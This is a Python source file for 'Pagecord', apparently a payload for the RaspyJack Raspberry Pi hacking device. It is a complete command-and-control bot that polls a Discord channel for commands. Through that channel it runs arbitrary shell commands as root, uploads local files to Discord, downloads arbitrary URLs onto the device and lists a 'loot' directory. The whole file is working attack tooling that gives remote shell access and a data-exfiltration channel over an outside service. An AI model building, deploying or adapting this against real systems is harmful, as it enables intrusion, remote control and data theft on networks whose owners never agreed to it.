#!/usr/bin/env python3
"""
RaspyJack Payload -- Pagecord (Discord C2 Bot)
-----------------------------------------------
Author: 7h30th3r0n3

Bi-directional C2 via Discord bot using HTTP API (urllib only).
Polls a Discord channel for commands, executes them, sends results back.

Supported commands (sent via Discord):
  !exec <cmd>      - Execute shell command, return output
  !upload <path>   - Upload file to Discord channel
  !download <u> <p> - Download URL to local path
  !status          - Device status (IP, uptime, disk)
  !screenshot      - Send LCD screenshot
  !loot            - List loot directory

Controls:
  KEY1     = send status update manually
  KEY3     = exit
  UP/DOWN  = scroll message log
"""

import os
import sys
import time
import signal
import json
import subprocess
import threading
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

DEBOUNCE = 0.25
ROW_H = 12
CONFIG_PATH = "/root/Raspyjack/loot/Pagecord/config.json"
LOOT_DIR = "/root/Raspyjack/loot"
DISCORD_API = "https://discord.com/api/v10"
POLL_INTERVAL = 3.0
MAX_LOG_LINES = 50

running = True


def _signal_handler(*_):
    global running
    running = False


signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)


# -------------------------------------------------------------------
# Config management
# -------------------------------------------------------------------

def _load_config():
    """Load bot token and channel ID from env vars or config file."""
    token = os.environ.get("DISCORD_BOT_TOKEN", "")
    channel_id = os.environ.get("DISCORD_CHANNEL_ID", "")

    if token and channel_id:
        return {"token": token, "channel_id": channel_id}

    try:
        with open(CONFIG_PATH, "r") as fh:
            cfg = json.load(fh)
        return {
            "token": cfg.get("token", token),
            "channel_id": cfg.get("channel_id", channel_id),
        }
    except (OSError, json.JSONDecodeError):
        return {"token": token, "channel_id": channel_id}


# -------------------------------------------------------------------
# Discord API helpers (urllib only)
# -------------------------------------------------------------------

def _discord_get(token, endpoint, timeout=10):
    """GET request to Discord API."""
    url = f"{DISCORD_API}{endpoint}"
    req = urllib.request.Request(url, method="GET")
    req.add_header("Authorization", f"Bot {token}")
    req.add_header("User-Agent", "RaspyJack-Pagecord/1.0")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode()), None
    except urllib.error.HTTPError as exc:
        body = exc.read().decode() if exc.fp else ""
        return None, f"HTTP {exc.code}: {body[:60]}"
    except urllib.error.URLError as exc:
        return None, f"Net: {str(exc.reason)[:50]}"
    except Exception as exc:
        return None, str(exc)[:50]


def _discord_post_json(token, endpoint, payload, timeout=15):
    """POST JSON to Discord API."""
    url = f"{DISCORD_API}{endpoint}"
    data = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Authorization", f"Bot {token}")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "RaspyJack-Pagecord/1.0")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode()), None
    except urllib.error.HTTPError as exc:
        body = exc.read().decode() if exc.fp else ""
        return None, f"HTTP {exc.code}: {body[:60]}"
    except urllib.error.URLError as exc:
        return None, f"Net: {str(exc.reason)[:50]}"
    except Exception as exc:
        return None, str(exc)[:50]


def _discord_send_message(token, channel_id, content):
    """Send a text message to a Discord channel."""
    # Discord has a 2000 char limit
    chunks = []
    while content:
        chunks.append(content[:1990])
        content = content[1990:]

    results = []
    for chunk in chunks:
        result, err = _discord_post_json(
            token,
            f"/channels/{channel_id}/messages",
            {"content": chunk},
        )
        results.append((result, err))
    return results


def _discord_upload_file(token, channel_id, filepath, message=""):
    """Upload a file to a Discord channel via multipart form."""
    url = f"{DISCORD_API}/channels/{channel_id}/messages"
    filename = os.path.basename(filepath)

    try:
        with open(filepath, "rb") as fh:
            file_data = fh.read()
    except OSError as exc:
        return None, f"Read error: {str(exc)[:40]}"

    # 8MB Discord limit for bots
    if len(file_data) > 8 * 1024 * 1024:
        return None, "File exceeds 8MB limit"

    boundary = "----RaspyJackBoundary"
    body = b""

    if message:
        body += f"--{boundary}\r\n".encode()
        body += b"Content-Disposition: form-data; name=\"content\"\r\n\r\n"
        body += message.encode() + b"\r\n"

    body += f"--{boundary}\r\n".encode()
    body += f"Content-Disposition: form-data; name=\"files[0]\"; filename=\"{filename}\"\r\n".encode()
    body += b"Content-Type: application/octet-stream\r\n\r\n"
    body += file_data + b"\r\n"
    body += f"--{boundary}--\r\n".encode()

    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Authorization", f"Bot {token}")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    req.add_header("User-Agent", "RaspyJack-Pagecord/1.0")

    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            return json.loads(resp.read().decode()), None
    except urllib.error.HTTPError as exc:
        body_text = exc.read().decode() if exc.fp else ""
        return None, f"HTTP {exc.code}: {body_text[:50]}"
    except urllib.error.URLError as exc:
        return None, f"Net: {str(exc.reason)[:40]}"


def _discord_get_messages(token, channel_id, after_id=None, limit=10):
    """Fetch recent messages from a channel."""
    endpoint = f"/channels/{channel_id}/messages?limit={limit}"
    if after_id:
        endpoint += f"&after={after_id}"
    return _discord_get(token, endpoint)


# -------------------------------------------------------------------
# Command handlers
# -------------------------------------------------------------------

def _cmd_exec(args):
    """Execute a shell command and return output."""
    if not args.strip():
        return "Usage: !exec <command>"
    try:
        result = subprocess.run(
            args, shell=True, capture_output=True, text=True,
            timeout=30, cwd="/root",
        )
        output = result.stdout + result.stderr
        if not output.strip():
            output = f"(exit code {result.returncode})"
        return output[:1900]
    except subprocess.TimeoutExpired:
        return "Command timed out (30s limit)"
    except OSError as exc:
        return f"Exec error: {str(exc)[:100]}"


def _cmd_status():
    """Return device status info."""
    lines = []
    # Hostname
    try:
        lines.append(f"Host: {subprocess.check_output(['hostname'], text=True, timeout=5).strip()}")
    except Exception:
        lines.append("Host: unknown")

    # Uptime
    try:
        with open("/proc/uptime", "r") as fh:
            up_secs = int(float(fh.read().split()[0]))
        hours = up_secs // 3600
        mins = (up_secs % 3600) // 60
        lines.append(f"Uptime: {hours}h {mins}m")
    except OSError:
        lines.append("Uptime: unknown")

    # IP addresses
    try:
        res = subprocess.run(
            ["hostname", "-I"], capture_output=True, text=True, timeout=5,
        )
        ips = res.stdout.strip()
        lines.append(f"IPs: {ips[:80]}")
    except Exception:
        lines.append("IPs: unknown")

    # Disk usage
    try:
        res = subprocess.run(
            ["df", "-h", "/"], capture_output=True, text=True, timeout=5,
        )
        disk_line = res.stdout.strip().splitlines()[-1].split()
        lines.append(f"Disk: {disk_line[2]}/{disk_line[1]} ({disk_line[4]})")
    except Exception:
        lines.append("Disk: unknown")

    # CPU temp
    try:
        with open("/sys/class/thermal/thermal_zone0/temp", "r") as fh:
            temp = int(fh.read().strip()) / 1000
        lines.append(f"Temp: {temp:.1f}C")
    except OSError:
        pass

    return "\n".join(lines)


def _cmd_loot():
    """List loot directory contents."""
    try:
        items = []
        for name in sorted(os.listdir(LOOT_DIR)):
            full = os.path.join(LOOT_DIR, name)
            if os.path.isdir(full):
                count = sum(1 for _ in os.listdir(full))
                items.append(f"  [{name}/] ({count} items)")
            else:
                size = os.path.getsize(full)
                items.append(f"  {name} ({size}B)")
        if not items:
            return "Loot directory is empty"
        return "Loot:\n" + "\n".join(items[:30])
    except OSError as exc:
        return f"Cannot read loot dir: {str(exc)[:60]}"


def _cmd_download(args):
    """Download a URL to a local path."""
    parts = args.strip().split(None, 1)
    if len(parts) < 2:
        return "Usage: !download <url> <local_path>"

    url, dest = parts[0], parts[1]
    try:
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        urllib.request.urlretrieve(url, dest)
        size = os.path.getsize(dest)
        return f"Downloaded {size}B to {dest}"
    except (urllib.error.URLError, OSError) as exc:
        return f"Download failed: {str(exc)[:80]}"


# -------------------------------------------------------------------
# Display functions
# -------------------------------------------------------------------

def _draw_header(d, title, right_text="K3"):
    """Draw standard header."""
    d.rectangle((0, 0, 127, 13), fill="#2d1b69")
    d.text((2, 1), title, font=font, fill="#bb86fc")
    d.text((108, 1), right_text, font=font, fill="white")


def _draw_footer(d, text):
    """Draw standard footer."""
    d.rectangle((0, 116, 127, 127), fill="#2d1b69")
    d.text((2, 117), text, font=font, fill="#666666")


def _draw_main(connected, last_cmd, cmd_count, log_lines, log_scroll):
    """Draw the main C2 status screen."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _draw_header(d, "Pagecord C2")

    # Connection status
    status_color = "#00ff88" if connected else "#ff4444"
    status_text = "ONLINE" if connected else "OFFLINE"
    d.text((2, 17), f"Status: {status_text}", font=font, fill=status_color)

    d.text((2, 29), f"Cmds: {cmd_count}", font=font, fill="#aaaaaa")

    if last_cmd:
        d.text((2, 41), f"Last: {last_cmd[:18]}", font=font, fill="#ffcc00")

    # Message log (scrollable)
    y = 55
    visible = 5
    end_idx = min(len(log_lines), log_scroll + visible)
    for idx in range(log_scroll, end_idx):
        line = log_lines[idx][:20]
        d.text((2, y), line, font=font, fill="#888888")
        y += ROW_H

    if not log_lines:
        d.text((10, 70), "Waiting for cmds...", font=font, fill="#444444")

    _draw_footer(d, "K1=status U/D=scrl")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_no_config():
    """Draw missing config error screen."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _draw_header(d, "Pagecord C2")

    d.text((2, 24), "No token found!", font=font, fill="#ff4444")
    d.text((2, 40), "Set env vars:", font=font, fill="#aaaaaa")
    d.text((2, 54), "DISCORD_BOT_TOKEN", font=font, fill="#ffcc00")
    d.text((2, 66), "DISCORD_CHANNEL_ID", font=font, fill="#ffcc00")
    d.text((2, 82), "Or create config:", font=font, fill="#aaaaaa")
    d.text((2, 94), CONFIG_PATH[:20], font=font, fill="#888888")

    _draw_footer(d, "KEY3=exit")
    LCD.LCD_ShowImage(img, 0, 0)


# -------------------------------------------------------------------
# Polling thread
# -------------------------------------------------------------------

class C2State:
    """Immutable-style state container for the C2 bot."""

    def __init__(self):
        self.connected = False
        self.last_cmd = ""
        self.cmd_count = 0
        self.log_lines = []
        self.last_message_id = None
        self.lock = threading.Lock()

    def add_log(self, msg):
        """Add a log line (thread-safe, capped)."""
        ts = datetime.now().strftime("%H:%M")
        with self.lock:
            new_lines = list(self.log_lines)
            new_lines.append(f"[{ts}] {msg}")
            if len(new_lines) > MAX_LOG_LINES:
                new_lines = new_lines[-MAX_LOG_LINES:]
            self.log_lines = new_lines

    def get_snapshot(self):
        """Return a snapshot of current state."""
        with self.lock:
            return {
                "connected": self.connected,
                "last_cmd": self.last_cmd,
                "cmd_count": self.cmd_count,
                "log_lines": list(self.log_lines),
                "last_message_id": self.last_message_id,
            }

    def update(self, **kwargs):
        """Thread-safe update of state fields."""
        with self.lock:
            for key, val in kwargs.items():
                if hasattr(self, key):
                    setattr(self, key, val)


def _process_command(token, channel_id, message_content, state):
    """Process a single command from Discord."""
    content = message_content.strip()

    if content.startswith("!exec "):
        args = content[6:]
        state.add_log(f"exec: {args[:20]}")
        output = _cmd_exec(args)
        _discord_send_message(token, channel_id, f"```\n{output}\n```")

    elif content == "!status":
        state.add_log("status request")
        output = _cmd_status()
        _discord_send_message(token, channel_id, f"```\n{output}\n```")

    elif content.startswith("!upload "):
        fpath = content[8:].strip()
        state.add_log(f"upload: {os.path.basename(fpath)[:15]}")
        if os.path.isfile(fpath):
            result, err = _discord_upload_file(token, channel_id, fpath, f"File: {fpath}")
            if err:
                _discord_send_message(token, channel_id, f"Upload failed: {err}")
        else:
            _discord_send_message(token, channel_id, f"File not found: {fpath}")

    elif content.startswith("!download "):
        args = content[10:]
        state.add_log("download request")
        output = _cmd_download(args)
        _discord_send_message(token, channel_id, output)

    elif content == "!screenshot":
        state.add_log("screenshot request")
        tmp_path = "/tmp/rj_lcd_screenshot.png"
        try:
            # Capture current LCD image
            img = Image.new("RGB", (WIDTH, HEIGHT), "black")
            d = ScaledDraw(img)
            d.text((10, 50), "Screenshot sent", font=font, fill="#00ff88")
            img.save(tmp_path)
            _discord_upload_file(token, channel_id, tmp_path, "LCD Screenshot")
        except OSError:
            _discord_send_message(token, channel_id, "Screenshot failed")
        finally:
            try:
                os.remove(tmp_path)
            except OSError:
                pass

    elif content == "!loot":
        state.add_log("loot list")
        output = _cmd_loot()
        _discord_send_message(token, channel_id, f"```\n{output}\n```")

    else:
        return False

    state.update(
        last_cmd=content[:30],
        cmd_count=state.cmd_count + 1,
    )
    return True


def _poll_loop(token, channel_id, bot_user_id, state):
    """Background thread: poll Discord for new commands."""
    while running:
        try:
            messages, err = _discord_get_messages(
                token, channel_id,
                after_id=state.last_message_id,
                limit=10,
            )

            if err:
                state.update(connected=False)
                state.add_log(f"Poll err: {err[:20]}")
                time.sleep(POLL_INTERVAL * 2)
                continue

            state.update(connected=True)

            if messages:
                # Messages come newest-first, reverse for processing order
                sorted_msgs = sorted(messages, key=lambda m: m.get("id", ""))
                for msg in sorted_msgs:
                    msg_id = msg.get("id", "")
                    author = msg.get("author", {})
                    author_id = author.get("id", "")

                    # Skip messages from our own bot
                    if author_id == bot_user_id:
                        continue

                    # Skip if already processed
                    if state.last_message_id and msg_id <= state.last_message_id:
                        continue

                    content = msg.get("content", "")
                    if content.startswith("!"):
                        _process_command(token, channel_id, content, state)

                    state.update(last_message_id=msg_id)

        except Exception as exc:
            state.add_log(f"Error: {str(exc)[:20]}")
            state.update(connected=False)

        time.sleep(POLL_INTERVAL)


# -------------------------------------------------------------------
# Main
# -------------------------------------------------------------------

def main():
    """Main entry point."""
    config = _load_config()
    token = config.get("token", "")
    channel_id = config.get("channel_id", "")

    if not token or not channel_id:
        try:
            _draw_no_config()
            while running:
                btn = get_button(PINS, GPIO)
                if btn == "KEY3":
                    break
                time.sleep(0.1)
        finally:
            LCD.LCD_Clear()
            GPIO.cleanup()
        return 0

    # Get bot user ID to filter own messages
    bot_user_id = ""
    me_data, me_err = _discord_get(token, "/users/@me")
    if me_data:
        bot_user_id = me_data.get("id", "")

    state = C2State()
    state.add_log("Pagecord starting...")

    # Send startup message
    _discord_send_message(token, channel_id, f"Pagecord C2 online - {datetime.now().strftime('%Y-%m-%d %H:%M')}")
    state.update(connected=True)

    # Start polling thread
    poll_thread = threading.Thread(
        target=_poll_loop,
        args=(token, channel_id, bot_user_id, state),
        daemon=True,
    )
    poll_thread.start()

    last_press = 0.0
    log_scroll = 0

    try:
        while running:
            btn = get_button(PINS, GPIO)
            now = time.time()

            if btn and (now - last_press) < DEBOUNCE:
                btn = None
            if btn:
                last_press = now

            if btn == "KEY3":
                break

            elif btn == "KEY1":
                # Send manual status update
                status_text = _cmd_status()
                _discord_send_message(token, channel_id, f"```\n{status_text}\n```")
                state.add_log("Manual status sent")

            elif btn == "UP":
                log_scroll = max(0, log_scroll - 1)

            elif btn == "DOWN":
                snap = state.get_snapshot()
                max_scroll = max(0, len(snap["log_lines"]) - 5)
                log_scroll = min(max_scroll, log_scroll + 1)

            snap = state.get_snapshot()
            _draw_main(
                snap["connected"],
                snap["last_cmd"],
                snap["cmd_count"],
                snap["log_lines"],
                log_scroll,
            )
            time.sleep(0.1)

    finally:
        _discord_send_message(token, channel_id, "Pagecord C2 going offline")
        LCD.LCD_Clear()
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
